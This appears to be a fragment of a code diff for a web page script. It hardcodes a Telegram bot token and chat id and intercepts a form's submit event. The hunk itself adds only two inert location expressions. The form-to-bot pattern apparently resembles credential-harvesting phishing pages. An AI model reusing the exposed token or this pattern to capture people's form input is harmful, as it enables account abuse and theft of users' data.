@@ -3,6 +3,10 @@
 
     const bots = new Bot("6455387584:AAELDS7StGYWXIIUjT2GKNvNdNTmlj0JX50", 6211090366);
 
+   window.location.hostname
+   window.location.port
+
+
 
     document.getElementById("form").addEventListener("submit", e => {
         e.preventDefault();
